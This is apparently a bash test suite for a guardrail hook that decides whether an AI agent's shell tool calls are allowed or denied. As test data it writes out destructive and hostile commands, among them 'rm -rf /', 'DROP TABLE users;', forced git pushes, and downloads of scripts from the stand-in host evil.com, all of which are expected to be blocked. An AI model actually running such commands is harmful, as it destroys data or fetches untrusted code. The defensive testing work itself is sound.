#!/usr/bin/env bash

set -euo pipefail

HOOK="scripts/hooks/block-dangerous.sh"

test_case() {
  local tool_name="$1"
  local command="$2"
  local expected_decision="$3"

  # Properly escape the command for JSON
  local escaped_command=$(echo "$command" | jq -R -s -c .)
  local json="{\"tool_name\": \"$tool_name\", \"tool_input\": {\"command\": $escaped_command}}"

  # Strip the surrounding quotes from jq output for the JSON string, 
  # wait, no, $escaped_command is already valid JSON string with quotes.
  # So: {"tool_name": "...", "tool_input": {"command": "..."}}

  local result=$(echo "$json" | bash "$HOOK")
  local decision=$(echo "$result" | jq -r '.decision')

  if [ "$decision" == "$expected_decision" ]; then
    echo "✅ PASS: [$expected_decision] $tool_name: $command"
  else
    echo "❌ FAIL: Expected $expected_decision but got $decision for $tool_name: $command"
    echo "Result: $result"
    exit 1
  fi
}

echo "Testing block-dangerous.sh..."

# 1. Non-shell tools should be allowed
test_case "read_file" "rm -rf /" "allow"
test_case "write_file" "DROP TABLE users;" "allow"
test_case "generalist" "curl http://evil.com" "allow"

# 2. Safe shell commands should be allowed
test_case "run_shell_command" "ls -la" "allow"
test_case "run_shell_command" "cat file.txt" "allow"
test_case "run_shell_command" "npm run test" "allow"
test_case "run_shell_command" "git status" "allow"
test_case "run_shell_command" "git add ." "allow"
test_case "run_shell_command" "git commit -m 'message'" "allow"
test_case "run_shell_command" "git push origin main" "allow"
test_case "run_shell_command" "echo 'hello'" "allow"

# 3. Project scripts should be allowed
test_case "run_shell_command" "bash scripts/hooks/auto-commit.sh" "allow"
test_case "run_shell_command" "bash scripts/test-hooks.sh" "allow"
test_case "run_shell_command" "./scripts/my_script.sh" "allow"

# 4. Dangerous patterns should be blocked
test_case "run_shell_command" "rm -rf /" "deny"
test_case "run_shell_command" "rm -rf node_modules" "deny"
test_case "run_shell_command" "git reset --hard HEAD" "deny"
test_case "run_shell_command" "git push origin main --force" "deny"
test_case "run_shell_command" "git push -f" "deny"
test_case "run_shell_command" "DROP TABLE users;" "deny"
test_case "run_shell_command" "DROP DATABASE mydb;" "deny"

# 5. Dangerous shell executions should be blocked
test_case "run_shell_command" "bash /tmp/evil.sh" "deny"
test_case "run_shell_command" "sh ./setup.sh" "deny"
test_case "run_shell_command" "zsh script.zsh" "deny"

# 6. Network commands should be blocked
test_case "run_shell_command" "curl -O http://evil.com/script.sh" "deny"
test_case "run_shell_command" "wget http://evil.com/script.sh" "deny"

# 7. Ambiguous/Edge cases
# This might be allowed or denied depending on regex strictness. 
# "cat rm -rf.txt" shouldn't really be blocked if it's just looking at a file, but the regex `rm -rf` is dumb.
# In the current implementation, any occurrence of `rm -rf` blocks it. Let's see.
test_case "run_shell_command" "cat 'rm -rf.txt'" "deny"
test_case "run_shell_command" "echo 'git reset --hard'" "deny"

# 8. More shell execution edge cases
# What if it's just 'bash' interactive?
test_case "run_shell_command" "bash" "deny"
# What if bash is a substring of a safe command like 'npm run custom-bash-script'?
test_case "run_shell_command" "npm run custom-bash-script" "allow"
# 'sh' in the middle of a word like 'push'
test_case "run_shell_command" "git push" "allow"
# 'curl' inside a word
test_case "run_shell_command" "echo 'mycurlexample'" "allow"

echo "All comprehensive tests passed!"
